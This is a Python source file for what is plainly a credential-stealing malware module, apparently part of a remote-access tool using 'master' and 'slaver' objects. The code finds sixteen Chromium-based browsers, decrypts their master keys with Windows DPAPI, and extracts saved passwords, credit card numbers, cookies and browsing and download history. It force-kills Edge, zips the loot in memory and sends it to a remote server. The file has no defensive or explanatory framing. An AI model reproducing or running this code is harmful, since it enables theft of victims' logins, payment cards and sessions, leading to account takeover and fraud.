import io
import os
import json
import base64
import sqlite3
import subprocess
import time
import zipfile
import shutil
from datetime import datetime
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES


class BrowserDataExtractor:
    def __init__(self):
        # Define paths to various browsers' user data directories
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

    def get_master_key(self, path: str):
        """
        Retrieve and decrypt the master key used for password decryption.

        Args:
            path (str): Path to the browser's user data directory.

        Returns:
            bytes: Decrypted master key.
        """
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        """
        Decrypt a password using the master key.

        Args:
            buff (bytes): Encrypted password.
            master_key (bytes): Decrypted master key.

        Returns:
            str: Decrypted password.
        """
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str, master_key):
        """
        Retrieve login data (saved passwords) from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.
            master_key: Master key for password decryption.

        Returns:
            str: Login data as a formatted string.
        """
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return
        result = ""
        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = self.decrypt_password(row[2], master_key)
            result += f"""
            URL: {row[0]}
            Email: {row[1]}
            Password: {password}

            """
        conn.close()
        os.remove('login_db')
        return result

    def get_credit_cards(self, path: str, profile: str, master_key):
        """
        Retrieve saved credit card information from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.
            master_key: Master key for credit card decryption.

        Returns:
            str: Credit card data as a formatted string.
        """
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        result = ""
        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], master_key)
            result += f"""
            Name On Card: {row[0]}
            Card Number: {card_number}
            Expires On:  {row[1]} / {row[2]}
            Added On: {datetime.fromtimestamp(row[4])}

            """

        conn.close()
        os.remove('cards_db')
        return result

    def get_cookies(self, path: str, profile: str, master_key):
        """
        Retrieve cookies from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.
            master_key: Master key for cookie decryption.

        Returns:
            str: Cookie data as a formatted string.
        """
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return
        result = ""
        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], master_key)

            result += f"""
            Host Key : {row[0]}
            Cookie Name : {row[1]}
            Path: {row[2]}
            Cookie: {cookie}
            Expires On: {row[4]}

            """

        conn.close()
        os.remove('cookie_db')
        return result

    def get_web_history(self, path: str, profile: str):
        """
        Retrieve web browsing history from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.

        Returns:
            str: Browsing history data as a formatted string.
        """
        web_history_db = f'{path}\\{profile}\\History'
        result = ""
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            result += f"""
            URL: {row[0]}
            Title: {row[1]}
            Visited Time: {row[2]}

            """
        conn.close()
        os.remove('web_history_db')
        return result

    def get_downloads(self, path: str, profile: str):
        """
        Retrieve download history from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.

        Returns:
            str: Download history data as a formatted string.
        """
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return
        result = ""
        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            result += f"""
            Download URL: {row[0]}
            Local Path: {row[1]}

            """

        conn.close()
        os.remove('downloads_db')
        return result

    def installed_browsers(self):
        """
        Check and return a list of installed browsers.

        Returns:
            list: List of installed browser names.
        """
        results = []
        for browser, path in self.browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results

    def save_results(self, browser_name, data_type, content):
        """
        Save extracted data to memory.

        Args:
            browser_name (str): Name of the browser.
            data_type (str): Type of data being saved.
            content (str): Data content.

        Returns:
            tuple: Filename, file bytes, and directory path.
        """
        dir_path = os.path.join(browser_name)

        if content is not None:
            # Create a file-like object in memory
            file_obj = io.StringIO()
            file_obj.write(content)

            # Get the bytes of the content
            file_bytes = file_obj.getvalue().encode('utf-8')

            filename = f"{data_type}.txt"

            print(f"\t [*] Saved {data_type} in memory")

            return filename, file_bytes, dir_path
        else:
            print("\t [-] No Data Found!")
            return None, None, None

    def terminate_edge(self):
        """
        Terminate Microsoft Edge browser.
        """
        # Use subprocess to run a command that terminates Microsoft Edge
        try:
            subprocess.run(["taskkill", "/f", "/im", "msedge.exe"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error terminating Microsoft Edge: {e}")

    def dump_sensible_data(self, slaver, address):
        """
        Extract and send sensitive data to a remote server.

        Args:
            slaver: Slaver object for communication.
            address: Address of the remote server.
        """
        available_browsers = self.installed_browsers()
        files = []
        separator = "\t------\n"

        for browser in available_browsers:
            browser_path = self.browsers[browser]
            master_key = self.get_master_key(browser_path)
            print(f"Getting Stored Details from {browser}")

            if "edge" in browser:
                self.terminate_edge()

            try:
                print("\t [!] Getting Saved Passwords")
                filename, filebytes, directory = self.save_results(browser, 'Saved_Passwords',
                                                                   self.get_login_data(browser_path, "Default",
                                                                                       master_key))
                if filebytes is not None:
                    files.append({"filename": os.path.join(directory, filename), "bytes": filebytes})
            except Exception as e:
                print(f"\t [!] Error getting Saved Passwords: {e}")

            print(separator)

            try:
                print("\t [!] Getting Browser History")
                filename, filebytes, directory = self.save_results(browser, 'Browser_History',
                                                                   self.get_web_history(browser_path, "Default"))
                if filebytes is not None:
                    files.append({"filename": os.path.join(directory, filename), "bytes": filebytes})
            except Exception as e:
                print(f"\t [!] Error getting Browser History: {e}")

            print(separator)

            try:
                print("\t [!] Getting Download History")
                filename, filebytes, directory = self.save_results(browser, 'Download_History',
                                                                   self.get_downloads(browser_path, "Default"))
                if filebytes is not None:
                    files.append({"filename": os.path.join(directory, filename), "bytes": filebytes})
            except Exception as e:
                print(f"\t [!] Error getting Download History: {e}")

            print(separator)

            try:
                print("\t [!] Getting Cookies")
                filename, filebytes, directory = self.save_results(browser, 'Browser_Cookies',
                                                                   self.get_cookies(browser_path, "Default",
                                                                                    master_key))
                if filebytes is not None:
                    files.append({"filename": os.path.join(directory, filename), "bytes": filebytes})
            except Exception as e:
                print(f"\t [!] Error getting Cookies: {e}")

            print(separator)

            try:
                print("\t [!] Getting Saved Credit Cards")
                filename, filebytes, directory = self.save_results(browser, 'Saved_Credit_Cards',
                                                                   self.get_credit_cards(browser_path, "Default",
                                                                                         master_key))
                if filebytes is not None:
                    files.append({"filename": os.path.join(directory, filename), "bytes": filebytes})
            except Exception as e:
                print(f"\t [!] Error getting Saved Credit Cards: {e}")

        # Create a zip file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
            for file in files:
                zip_file.writestr(file["filename"], file["bytes"])

        zip_buffer.seek(0)
        zip_bytes = zip_buffer.read()
        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
        slaver.send_file_to_master(address, f"sensible_data_{timestamp}.zip", zip_bytes)
